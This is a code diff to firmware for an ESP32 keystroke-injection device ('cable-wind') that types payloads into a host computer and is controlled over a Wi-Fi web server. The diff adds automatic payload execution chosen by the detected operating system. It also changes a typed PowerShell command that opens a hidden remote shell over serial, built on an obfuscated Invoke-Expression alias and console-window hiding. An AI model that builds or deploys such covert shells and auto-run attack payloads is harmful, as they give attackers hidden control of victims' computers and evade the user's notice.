@@ -15,6 +15,8 @@
 #include "config.h"
 #include "readfile.h"
 #include "listpayloads.h"
+#include "autoexecplanning.h"
+#include <ArduinoJson.h>
 #include <map>
 
 // Config default SSID, password and channel
@@ -42,12 +44,14 @@ volatile bool caps_status = false;
 volatile bool num_status = false;
 volatile bool scroll_status = false;
 volatile bool numlock_checked = false;
+volatile bool os_detection_complete = false;
 unsigned long caps_sent_time = 0;
 unsigned long num_sent_time = 0;
 unsigned long scroll_sent_time = 0;
 unsigned long caps_delay = 0;
 unsigned long num_delay = 0;
 unsigned long scroll_delay = 0;
+const unsigned char *selected_layout = en_us; // Default to EN_US
 
 File fsUploadFile;
 WebServer controlserver(80);
@@ -86,27 +90,6 @@ extern const unsigned char sk_sk[128];
 extern const unsigned char cz_cz[128];
 extern const unsigned char sv_se[128];
 extern const unsigned char si_si[128];
-
-std::map<String, const unsigned char *> layoutMap = {
-  { "layout1", en_us },
-  { "layout2", es_es },
-  { "layout3", fr_fr },
-  { "layout4", it_it },
-  { "layout5", da_dk },
-  { "layout6", de_de },
-  { "layout7", hr_hr },
-  { "layout8", hu_hu },
-  { "layout9", pt_pt },
-  { "layout10", pt_br },
-  { "layout11", be_be },
-  { "layout12", br_br },
-  { "layout13", ca_ca },
-  { "layout14", ca_fr },
-  { "layout15", sk_sk },
-  { "layout16", cz_cz },
-  { "layout17", sv_se },
-  { "layout18", si_si },
-};
 
 std::map<String, const unsigned char *> layoutMapInit = {
   { "EN_US", en_us },
@@ -351,6 +334,7 @@ void printDetectedOS() {
       os = "OS Unknown";
       break;
   }
+  os_detection_complete = true;
 }
 
 void onDetectOSRequested() {
@@ -369,29 +353,33 @@ void deleteFile(fs::FS &fs, const String &path) {
 }
 
 void readFile(fs::FS &fs, const String &path) {
-  String payloadContent = "";
+    String payloadContent = "";
 
-  File file = fs.open(path);
-  if (!file || file.isDirectory()) {
-    FileList = "Failed to open file";
-    return;
-  }
-  while (file.available()) {
-    payloadContent += file.readString();
-  }
-  file.close();
+    File file = fs.open(path);
+    if (!file || file.isDirectory()) {
+        FileList = "Failed to open file";
+        return;
+    }
+    while (file.available()) {
+        payloadContent += file.readString();
+    }
+    file.close();
 
-  if (path == "") {
-    FileList = "File name is empty";
-    return;
-  }
+    if (path == "") {
+        FileList = "File name is empty";
+        return;
+    }
 
-  FileList = StaticFileList;
-  FileList.replace("{{path}}", path);
-  FileList.replace("{{payloadContent}}", payloadContent);
+    // Set layout based on payload content
+    setLayoutFromPayload(payloadContent);
 
-  livepayload = payloadContent;
+    FileList = StaticFileList;
+    FileList.replace("{{path}}", path);
+    FileList.replace("{{payloadContent}}", payloadContent);
+
+    livepayload = payloadContent;
 }
+
 
 // Helper function to save payload metadata
 void savePayloadMetadata(const String &filename, const String &name, const String &description) {
@@ -407,13 +395,24 @@ void savePayloadMetadata(const String &filename, const String &name, const Strin
 // Helper function to read payload metadata
 String readPayloadMetadata(const String &filename, bool getName) {
     String metaPath = filename + ".meta";
+    
+    // If no metadata file exists, return defaults
     if (!LittleFS.exists(metaPath)) {
-        return getName ? filename.substring(filename.lastIndexOf('/') + 1) : "No description";
+        if (getName) {
+            // Extract filename without path
+            int lastSlash = filename.lastIndexOf('/');
+            return filename.substring(lastSlash + 1);
+        }
+        return "No description";
     }
     
     File metaFile = LittleFS.open(metaPath, FILE_READ);
     if (!metaFile) {
-        return getName ? filename.substring(filename.lastIndexOf('/') + 1) : "No description";
+        if (getName) {
+            int lastSlash = filename.lastIndexOf('/');
+            return filename.substring(lastSlash + 1);
+        }
+        return "No description";
     }
     
     String name = metaFile.readStringUntil('\n');
@@ -539,14 +538,88 @@ void handleStats() {
   json += ",\"temperature\":" + String(temperatureRead());
   json += ",\"totalram\":" + String(ESP.getHeapSize());
   json += ",\"freeram\":" + String(ESP.getFreeHeap());
-  json += ",\"os\":\"" + os + "\"";  // <-- Aquí se agrega
+  json += ",\"os\":\"" + os + "\"";
+  json += ",\"ssid\":\"" + WiFi.SSID() + "\"";
+  json += ",\"ipaddress\":\"" + WiFi.localIP().toString() + "\"";
   json += "}";
   controlserver.send(200, "application/json", json);
 }
 
+void handleUpdateHostname() {
+    if (controlserver.hasArg("hostname")) {
+        String newHostname = controlserver.arg("hostname");
+        
+        File fsUploadFile = LittleFS.open("/hostname_config.txt", FILE_WRITE);
+        if (!fsUploadFile) {
+            controlserver.send(500, "application/json", "{\"success\":false,\"message\":\"Failed to save hostname\"}");
+            return;
+        }
+        
+        fsUploadFile.println(newHostname);
+        fsUploadFile.close();
+        controlserver.send(200, "application/json", "{\"success\":true,\"message\":\"Hostname updated successfully! Device will restart.\"}");
+        delay(1000);
+        ESP.restart();
+    } else {
+        controlserver.send(400, "application/json", "{\"success\":false,\"message\":\"No hostname provided\"}");
+    }
+}
+
+void handleGetHostname() {
+    String currentHostname = "cable-wind"; // default
+    
+    if (LittleFS.exists("/hostname_config.txt")) {
+        File fsUploadFile = LittleFS.open("/hostname_config.txt", FILE_READ);
+        if (fsUploadFile) {
+            currentHostname = fsUploadFile.readStringUntil('\n');
+            currentHostname.trim();
+            fsUploadFile.close();
+        }
+    }
+    
+    controlserver.send(200, "text/plain", currentHostname);
+}
+
+// Function to parse and set layout from payload content
+void setLayoutFromPayload(const String &payloadContent) {
+    int layoutPos = payloadContent.indexOf("# Layout: ");
+
+    if (layoutPos != -1) {
+        int start = layoutPos + 10;
+        int end = payloadContent.indexOf('\n', start);
+        if (end == -1) {
+            end = payloadContent.length();
+        }
+        String tmp_layout = payloadContent.substring(start, end);
+        tmp_layout.trim();
+
+        if (layoutMapInit.find(tmp_layout) != layoutMapInit.end()) {
+            selected_layout = layoutMapInit[tmp_layout];
+            Keyboard.setLayout(selected_layout);
+            return; // Exit after setting layout from payload
+        }
+    }
+    
+    // Fallback to saved layout if no layout specified in payload
+    if (LittleFS.exists("/layout_config.txt")) {
+        File fsUploadFile = LittleFS.open("/layout_config.txt", FILE_READ);
+        if (fsUploadFile) {
+            String layoutKey = fsUploadFile.readStringUntil('\n');
+            layoutKey.trim();
+            fsUploadFile.close();
+
+            auto it = layoutMapInit.find(layoutKey);
+            if (it != layoutMapInit.end()) {
+                selected_layout = it->second;
+                Keyboard.setLayout(selected_layout);
+            }
+        }
+    }
+}
+
 // Function to get the currently selected layout
 String getCurrentLayout() {
-  String currentLayout = "layout1"; // Default to EN_US
+  String currentLayout = "en_us"; // Default to EN_US
   
   if (LittleFS.exists("/layout_config.txt")) {
     File fsUploadFile = LittleFS.open("/layout_config.txt", FILE_READ);
@@ -632,7 +705,7 @@ void payloadExec() {
     delay(200);
     Keyboard.println("powershell");
     delay(1000);
-    Keyboard.print("Start-Job -ScriptBlock { $a = [System.IO.Ports.SerialPort]::GetPortNames(); $p = New-Object System.IO.Ports.SerialPort $a, 115200, None, 8, one; $p.DtrEnable = $true; [array]$mk = \"I\", \"f\", \"E\", \"x\", \"X\"; Set-Alias f $($mk | ForEach-Object { if ($_ -cmatch '[A-Z]') { $x += $_ } }; $x); $p.Open(); Start-Sleep -Seconds 2; while ($true) { $c = $p.ReadLine(); if ($c -eq \"exit\") { break }; $o = f \"$c\"; $p.WriteLine($o); $p.WriteLine(\"END_OF_COMMAND\") }; $p.Close() };function Hide-ConsoleWindow() {$ShowWindowAsyncCode='[DllImport(\"user32.dll\")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);';$ShowWindowAsync=Add-Type -MemberDefinition $ShowWindowAsyncCode -name Win32ShowWindowAsync -namespace Win32Functions -PassThru;$hwnd=(Get-Process -PID $pid).MainWindowHandle;if($hwnd -ne [System.IntPtr]::Zero){$ShowWindowAsync::ShowWindowAsync($hwnd,0)}else{$UniqueWindowTitle=New-Guid;$Host.UI.RawUI.WindowTitle=$UniqueWindowTitle;$StringBuilder=New-Object System.Text.StringBuilder 1024;$TerminalProcess=(Get-Process | Where-Object { $_.MainWindowTitle -eq $UniqueWindowTitle });$hwnd=$TerminalProcess.MainWindowHandle;if($hwnd -ne [System.IntPtr]::Zero){$ShowWindowAsync::ShowWindowAsync($hwnd,0)}}};Hide-ConsoleWindow");
+    Keyboard.print("Start-Job -ScriptBlock { $a = [System.IO.Ports.SerialPort]::GetPortNames(); $p = New-Object System.IO.Ports.SerialPort $a[$a.Length-1], 115200, None, 8, one; $p.DtrEnable = $true; [array]$mk = \"I\", \"f\", \"E\", \"x\", \"X\"; Set-Alias f $($mk | ForEach-Object { if ($_ -cmatch '[A-Z]') { $x += $_ } }; $x); $p.Open(); Start-Sleep -Seconds 2; while ($true) { $c = $p.ReadLine(); if ($c -eq \"exit\") { break }; $o = f \"$c\"; $p.WriteLine($o); $p.WriteLine(\"END_OF_COMMAND\") }; $p.Close() };function Hide-ConsoleWindow() {$ShowWindowAsyncCode='[DllImport(\"user32.dll\")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);';$ShowWindowAsync=Add-Type -MemberDefinition $ShowWindowAsyncCode -name Win32ShowWindowAsync -namespace Win32Functions -PassThru;$hwnd=(Get-Process -PID $pid).MainWindowHandle;if($hwnd -ne [System.IntPtr]::Zero){$ShowWindowAsync::ShowWindowAsync($hwnd,0)}else{$UniqueWindowTitle=New-Guid;$Host.UI.RawUI.WindowTitle=$UniqueWindowTitle;$StringBuilder=New-Object System.Text.StringBuilder 1024;$TerminalProcess=(Get-Process | Where-Object { $_.MainWindowTitle -eq $UniqueWindowTitle });$hwnd=$TerminalProcess.MainWindowHandle;if($hwnd -ne [System.IntPtr]::Zero){$ShowWindowAsync::ShowWindowAsync($hwnd,0)}}};Hide-ConsoleWindow");
     delay(1000);
     Keyboard.press(KEY_RETURN);
     delay(100);
@@ -930,6 +1003,27 @@ void handleUpdateWiFi() {
   }
 }
 
+void handleUpdateBackupWiFi() {
+  if (controlserver.hasArg("ssid") && controlserver.hasArg("password")) {
+    String ssid = controlserver.arg("ssid");
+    String password = controlserver.arg("password");
+    File file = LittleFS.open("/wifi_backup_config.txt", FILE_WRITE);
+    if (!file) {
+      controlserver.send(500, "application/json", "{\"status\":\"error\",\"message\":\"Failed to save backup Wi-Fi config\"}");
+      return;
+    }
+    file.println(ssid);
+    file.println(password);
+    file.close();
+    controlserver.send(200, "application/json", "{\"status\":\"success\",\"message\":\"Backup Wi-Fi config saved. Device will restart.\"}");
+    delay(1000);
+    ESP.restart();
+  } else {
+    controlserver.send(400, "application/json", "{\"status\":\"error\",\"message\":\"Missing SSID or password\"}");
+  }
+}
+
+
 void handleDeleteWiFiConfig() {
   if (LittleFS.exists("/wifi_config.txt")) {
     if (LittleFS.remove("/wifi_config.txt")) {
@@ -943,6 +1037,21 @@ void handleDeleteWiFiConfig() {
     controlserver.send(500, "application/json", "{\"status\":\"error\",\"message\":\"File does not exist\"}");
   }
 }
+
+void handleDeleteBackupWiFiConfig() {
+  if (LittleFS.exists("/wifi_backup_config.txt")) {
+    if (LittleFS.remove("/wifi_backup_config.txt")) {
+      controlserver.send(200, "application/json", "{\"status\":\"success\",\"message\":\"Backup Wi-Fi config deleted successfully\"}");
+      delay(1000);
+      ESP.restart();
+    } else {
+      controlserver.send(500, "application/json", "{\"status\":\"error\",\"message\":\"Failed to delete backup Wi-Fi config\"}");
+    }
+  } else {
+    controlserver.send(500, "application/json", "{\"status\":\"error\",\"message\":\"Backup Wi-Fi config does not exist\"}");
+  }
+}
+
 
 void handleUpdateUSB() {
   if (controlserver.hasArg("vendorID") && controlserver.hasArg("productID") && controlserver.hasArg("productName") && controlserver.hasArg("manufacturerName")) {
@@ -986,9 +1095,9 @@ void handleDeleteUSBConfig() {
 void handleLayout() {
   if (controlserver.hasArg("layout")) {
     String layout = controlserver.arg("layout");
-    auto it = layoutMap.find(layout);
+    auto it = layoutMapInit.find(layout);
 
-    if (it != layoutMap.end()) {
+    if (it != layoutMapInit.end()) {
       Keyboard.setLayout(it->second);
       saveLayoutConfig(layout); // Save the layout selection
       controlserver.send(200, "text/plain", "Layout applied successfully!");
@@ -1053,52 +1162,31 @@ void setup() {
   Keyboard.begin();
   USBSerial.begin();
 
-  // Load the saved layout if it exists
-  const unsigned char *selected_layout = en_us; // Default to EN_US
-  
   if (LittleFS.exists("/layout_config.txt")) {
-    File fsUploadFile = LittleFS.open("/layout_config.txt", FILE_READ);
-    if (fsUploadFile) {
-      String layoutKey = fsUploadFile.readStringUntil('\n');
-      layoutKey.trim();
-      
-      auto it = layoutMap.find(layoutKey);
-      if (it != layoutMap.end()) {
-        selected_layout = it->second;
+      File fsUploadFile = LittleFS.open("/layout_config.txt", FILE_READ);
+      if (fsUploadFile) {
+          String layoutKey = fsUploadFile.readStringUntil('\n');
+          layoutKey.trim();
+          fsUploadFile.close();
+          auto it = layoutMapInit.find(layoutKey);
+          if (it != layoutMapInit.end()) {
+              selected_layout = it->second;
+          }
       }
-      
-      fsUploadFile.close();
-    }
   }
-
   Keyboard.setLayout(selected_layout);
 
   if (LittleFS.exists("/payloads/payload-startup.txt")) {
-    File fsUploadFile = LittleFS.open("/payloads/payload-startup.txt", FILE_READ);
-    if (fsUploadFile) {
-      livepayload = fsUploadFile.readString();
-      int layoutPos = livepayload.indexOf("# Layout: ");
-      const unsigned char *selected_layout = en_us;
-
-      if (layoutPos != -1) {
-        int start = layoutPos + 10;
-        int end = livepayload.indexOf('\n', start);
-        if (end == -1) {
-          end = livepayload.length();
-        }
-        String tmp_layout = livepayload.substring(start, end);
-        tmp_layout.trim();
-
-        if (layoutMapInit.find(tmp_layout) != layoutMapInit.end()) {
-          selected_layout = layoutMapInit[tmp_layout];
-        }
+      File fsUploadFile = LittleFS.open("/payloads/payload-startup.txt", FILE_READ);
+      if (fsUploadFile) {
+          livepayload = fsUploadFile.readString();
+          // Set layout based on payload content
+          setLayoutFromPayload(livepayload);
+          payload_state = 1;
+          payloadExecuted = false;
       }
-      Keyboard.setLayout(selected_layout);
-      payload_state = 1;
-      payloadExecuted = false;
-    }
   }
-
+   
   if (LittleFS.exists("/wifi_config.txt")) {
     File fsUploadFile = LittleFS.open("/wifi_config.txt", FILE_READ);
     if (fsUploadFile) {
@@ -1111,14 +1199,61 @@ void setup() {
   }
 
   WiFi.begin(ssid.c_str(), password.c_str());
+  unsigned long startAttemptTime = millis();
 
-  while (WiFi.status() != WL_CONNECTED) {
+  // Try primary WiFi for 10 seconds
+  while (WiFi.status() != WL_CONNECTED && millis() - startAttemptTime < 10000) {
     delay(500);
   }
 
-  if (!MDNS.begin("cable-wind")) {
-    while (1) {
-      delay(1000);
+  String hostname = "cable-wind";
+  if (LittleFS.exists("/hostname_config.txt")) {
+      File fsUploadFile = LittleFS.open("/hostname_config.txt", FILE_READ);
+      if (fsUploadFile) {
+          hostname = fsUploadFile.readStringUntil('\n');
+          hostname.trim();
+          fsUploadFile.close();
+      }
+  }
+
+  if (!MDNS.begin(hostname.c_str())) {
+      while (1) {
+          delay(1000);
+      }
+  }
+
+  // If primary WiFi failed, try backup WiFi if it exists
+  if (WiFi.status() != WL_CONNECTED && LittleFS.exists("/wifi_backup_config.txt")) {
+    File file = LittleFS.open("/wifi_backup_config.txt", FILE_READ);
+    if (file) {
+      String backupSSID = file.readStringUntil('\n'); 
+      backupSSID.trim();
+      String backupPassword = file.readStringUntil('\n'); 
+      backupPassword.trim();
+      file.close();
+
+      WiFi.begin(backupSSID.c_str(), backupPassword.c_str());
+      startAttemptTime = millis();
+
+      // Try backup WiFi for 10 seconds
+      while (WiFi.status() != WL_CONNECTED && millis() - startAttemptTime < 10000) {
+        delay(500);
+      }
+    }
+    String hostname = "cable-wind";
+    if (LittleFS.exists("/hostname_config.txt")) {
+        File fsUploadFile = LittleFS.open("/hostname_config.txt", FILE_READ);
+        if (fsUploadFile) {
+            hostname = fsUploadFile.readStringUntil('\n');
+            hostname.trim();
+            fsUploadFile.close();
+        }
+    }
+
+    if (!MDNS.begin(hostname.c_str())) {
+        while (1) {
+            delay(1000);
+        }
     }
   }
 
@@ -1175,10 +1310,16 @@ void setup() {
   });
 
   controlserver.on("/style.css", []() {
+    // Set aggressive caching for CSS
+    controlserver.sendHeader("Cache-Control", "public, max-age=31536000"); // Cache for 1 year
+    controlserver.sendHeader("ETag", "\"v1.0\""); // Add ETag for cache validation
     controlserver.send_P(200, "text/css", Style);
-  });
+  }); 
 
   controlserver.on("/javascript.js", []() {
+    // Set aggressive caching for JavaScript
+    controlserver.sendHeader("Cache-Control", "public, max-age=31536000"); // Cache for 1 year
+    controlserver.sendHeader("ETag", "\"v1.0\""); // Add ETag for cache validation
     controlserver.send_P(200, "application/javascript", Redirect);
   });
 
@@ -1197,35 +1338,41 @@ void setup() {
       payloadExecuted = false;
     }
     controlserver.send(200, "text/plain", "Payload running...");
-  });
+  }); 
 
   controlserver.on("/runlivestartup", []() {
-    String payload_startup = controlserver.arg("livepayload");
-    String fileName = "payload-startup.txt";
-    String filePath = "/payloads/" + fileName;
+      String payload_startup = controlserver.arg("livepayload");
+      String fileName = "payload-startup.txt";
+      String filePath = "/payloads/" + fileName;
 
-    if (!LittleFS.exists("/payloads")) {
-      LittleFS.mkdir("/payloads");
-    }
+      if (!LittleFS.exists("/payloads")) {
+          LittleFS.mkdir("/payloads");
+      }
 
-    File fsUploadFile = LittleFS.open(filePath, FILE_WRITE);
-    if (!fsUploadFile) {
-      controlserver.send(500, "text/plain", "Failed to open file for writing");
-      return;
-    }
+      File fsUploadFile = LittleFS.open(filePath, FILE_WRITE);
+      if (!fsUploadFile) {
+          controlserver.send(500, "text/plain", "Failed to open file for writing");
+          return;
+      }
 
-    fsUploadFile.print(payload_startup);
-    fsUploadFile.close();
+      fsUploadFile.print(payload_startup);
+      fsUploadFile.close();
 
-    payloadExecuted = true;
-    controlserver.send(200, "text/plain", "Payload saved");
-  });
+      // Set layout based on payload content if specified
+      setLayoutFromPayload(payload_startup);
+
+      payloadExecuted = true;
+      controlserver.send(200, "text/plain", "Payload saved");
+  }); 
   
   controlserver.on("/runlivesave", HTTP_POST, []() {
       String payload_save = controlserver.arg("livepayload");
       String payloadName = controlserver.arg("payloadName");
       String payloadDesc = controlserver.arg("payloadDescription");
       String fileName;
+
+      // Set layout based on payload content if specified
+      setLayoutFromPayload(payload_save);
 
       int namePos = payload_save.indexOf("# Name: ");
       if (namePos != -1) {
@@ -1295,6 +1442,111 @@ void setup() {
     }
   });
 
+  controlserver.on("/autoexecplanning", []() {
+      controlserver.send_P(200, "text/html", AutoExecPlanning);
+  });
+
+  controlserver.on("/listpayloadsdata", []() {
+      DynamicJsonDocument doc(4096);
+      JsonArray payloads = doc.to<JsonArray>();
+
+      File root = LittleFS.open("/payloads/");
+      if (root && root.isDirectory()) {
+          File file = root.openNextFile();
+          while (file) {
+              String fileName = file.name();
+              if (!fileName.endsWith(".meta")) {
+                  String filePath = "/payloads/" + fileName;
+                  String payloadName = readPayloadMetadata(filePath, true);
+                  String payloadDesc = readPayloadMetadata(filePath, false);
+
+                  JsonObject payload = payloads.createNestedObject();
+                  payload["path"] = filePath;
+                  payload["name"] = payloadName;
+                  payload["description"] = payloadDesc;
+                  payload["filename"] = fileName;
+              }
+              file = root.openNextFile();
+          }
+      }
+
+      String output;
+      serializeJson(doc, output);
+      controlserver.send(200, "application/json", output);
+  });
+
+  controlserver.on("/saveautoexecplan", HTTP_POST, []() {
+      String payload = controlserver.arg("plain");
+      DynamicJsonDocument doc(2048);
+      deserializeJson(doc, payload);
+
+      File file = LittleFS.open("/autoexec_plan.json", FILE_WRITE);
+      if (!file) {
+          controlserver.send(500, "application/json", "{\"success\":false}");
+          return;
+      }
+
+      serializeJson(doc, file);
+      file.close();
+      controlserver.send(200, "application/json", "{\"success\":true}");
+  });
+
+  controlserver.on("/getautoexecplan", []() {
+      if (!LittleFS.exists("/autoexec_plan.json")) {
+          controlserver.send(200, "application/json", "{}");
+          return;
+      }
+
+      File file = LittleFS.open("/autoexec_plan.json", FILE_READ);
+      if (!file) {
+          controlserver.send(500, "application/json", "{}");
+          return;
+      }
+
+      String content = file.readString();
+      file.close();
+      controlserver.send(200, "application/json", content);
+  });
+
+  controlserver.on("/clearautoexecplan", HTTP_POST, []() {
+      if (LittleFS.exists("/autoexec_plan.json")) {
+          LittleFS.remove("/autoexec_plan.json");
+      }
+      controlserver.send(200, "application/json", "{\"success\":true}");
+  });
+
+  controlserver.on("/updatepayload", HTTP_POST, []() {
+      if (controlserver.hasArg("plain")) {  // Check for JSON data
+          String payload = controlserver.arg("plain");
+          DynamicJsonDocument doc(2048);
+          deserializeJson(doc, payload);
+  
+          String path = doc["path"].as<String>();
+          String content = doc["content"].as<String>();
+  
+          if (path.length() > 0 && content.length() > 0) {
+              File file = LittleFS.open(path, FILE_WRITE);
+              if (!file) {
+                  controlserver.send(500, "application/json", "{\"success\":false,\"message\":\"Failed to open file for writing\"}");
+                  return;
+              }
+  
+              file.print(content);
+              file.close();
+  
+              // Update layout if specified in payload
+              setLayoutFromPayload(content);
+  
+              controlserver.send(200, "application/json", "{\"success\":true,\"message\":\"Payload updated successfully\"}");
+          } else {
+              controlserver.send(400, "application/json", "{\"success\":false,\"message\":\"Missing path or content parameters\"}");
+          }
+      } else {
+          controlserver.send(400, "application/json", "{\"success\":false,\"message\":\"No data received\"}");
+      }
+  });
+
+
   controlserver.on("/updatewifi", HTTP_POST, handleUpdateWiFi);
   controlserver.on("/layout", HTTP_POST, handleLayout);
   controlserver.on("/deletewificonfig", HTTP_POST, handleDeleteWiFiConfig);
@@ -1302,6 +1554,10 @@ void setup() {
   controlserver.on("/deleteusbconfig", HTTP_POST, handleDeleteUSBConfig);
   controlserver.on("/deletepayload", HTTP_POST, handleDeletePayload);
   controlserver.on("/getcurrentlayout", handleGetCurrentLayout);
+  controlserver.on("/updatehostname", HTTP_POST, handleUpdateHostname);
+  controlserver.on("/gethostname", handleGetHostname);
+  controlserver.on("/updatebackupwifi", HTTP_POST, handleUpdateBackupWiFi);
+  controlserver.on("/deletebackupwificonfig", HTTP_POST, handleDeleteBackupWiFiConfig);
 
   httpUpdater.setup(&controlserver);
   controlserver.begin();
@@ -1312,34 +1568,114 @@ void loop() {
   delay(10);
   vTaskDelay(1);
 
+  // Check if we should auto-execute a payload
+  static bool autoExecChecked = false;
+  static unsigned long osDetectionStartTime = 0;
+  static bool osDetectionInProgress = false;
+  static DynamicJsonDocument pendingAutoExecPlan(2048);
+  static bool hasPendingPlan = false;
+
+  if (!autoExecChecked && LittleFS.exists("/autoexec_plan.json")) {
+      File file = LittleFS.open("/autoexec_plan.json", FILE_READ);
+      if (file) {
+          String content = file.readString();
+          file.close();
+          deserializeJson(pendingAutoExecPlan, content);
+
+          if (pendingAutoExecPlan["enabled"] == true) {
+              // Check if we have a no-detection payload
+              if (pendingAutoExecPlan["nodetection"]) {
+                  String osPayloadPath = pendingAutoExecPlan["nodetection"]["path"].as<String>();
+                  if (osPayloadPath.length() > 0 && LittleFS.exists(osPayloadPath)) {
+                      readFile(LittleFS, osPayloadPath);
+                      payload_state = 1;
+                      payloadExecuted = false;
+                      autoExecChecked = true;
+                  }
+              } else {
+                  // If no no-detection payload, proceed with OS detection
+                  onDetectOSRequested();
+                  osDetectionStartTime = millis();
+                  osDetectionInProgress = true;
+                  hasPendingPlan = true;
+                  autoExecChecked = true;
+              }
+          }
+      }
+  }
+
+  // Handle OS detection completion
+  if (osDetectionInProgress) {
+      if (os_detection_complete) {
+          // Detection complete, execute payload if available
+          if (hasPendingPlan) {
+              String osPayloadPath = "";  
+
+              switch (detected_os) {
+                  case OS_WINDOWS: 
+                      osPayloadPath = pendingAutoExecPlan["windows"]["path"].as<String>(); 
+                      break;
+                  case OS_LINUX:   
+                      osPayloadPath = pendingAutoExecPlan["linux"]["path"].as<String>(); 
+                      break;
+                  case OS_IOS:     
+                      osPayloadPath = pendingAutoExecPlan["ios"]["path"].as<String>(); 
+                      break;
+                  case OS_MACOS:   
+                      osPayloadPath = pendingAutoExecPlan["macos"]["path"].as<String>(); 
+                      break;
+                  case OS_ANDROID: 
+                      osPayloadPath = pendingAutoExecPlan["android"]["path"].as<String>(); 
+                      break;
+                  default: 
+                      break;
+              }
+
+              if (osPayloadPath.length() > 0 && LittleFS.exists(osPayloadPath)) {
+                  readFile(LittleFS, osPayloadPath);
+                  payload_state = 1;
+                  payloadExecuted = false;
+              }
+          }
+          osDetectionInProgress = false;
+          hasPendingPlan = false;
+      } 
+      else if (millis() - osDetectionStartTime > 30000) {
+          // Timeout after 30 seconds if detection fails
+          os = "OS Unknown";
+          os_detection_complete = true;
+          osDetectionInProgress = false;
+          hasPendingPlan = false;
+      }
+  }
+  
   while (USBSerial.available()) {
-    String data = USBSerial.readString();
-    clientServer.print(data);
+      String data = USBSerial.readString();
+      clientServer.print(data);
   }
-
   while (clientServer.available()) {
-    String data = clientServer.readString();
-    USBSerial.print(data);
+      String data = clientServer.readString();
+      USBSerial.print(data);
   }
-
   if (payload_state == 1) {
-    char *splitlines;
-    int payloadlen = livepayload.length() + 1;
-    char request[payloadlen];
-    livepayload.toCharArray(request, payloadlen);
-    splitlines = strtok(request, "\r\n");
+      // Set layout before executing payload
+      setLayoutFromPayload(livepayload);
 
-    while (splitlines != NULL) {
-      cmd = splitlines;
-      payloadExec();
-      splitlines = strtok(NULL, "\r\n");
-      vTaskDelay(1);
-    }
-
-    payload_state = 0;
-    cmd = "";
-    livepayload = "";
-    payloadExecuted = true;
+      char *splitlines;
+      int payloadlen = livepayload.length() + 1;
+      char request[payloadlen];
+      livepayload.toCharArray(request, payloadlen);
+      splitlines = strtok(request, "\r\n");
+      while (splitlines != NULL) {
+          cmd = splitlines;
+          payloadExec();
+          splitlines = strtok(NULL, "\r\n");
+          vTaskDelay(1);
+      }
+      payload_state = 0;
+      cmd = "";
+      livepayload = "";
+      payloadExecuted = true;
   }
   vTaskDelay(1);
 }
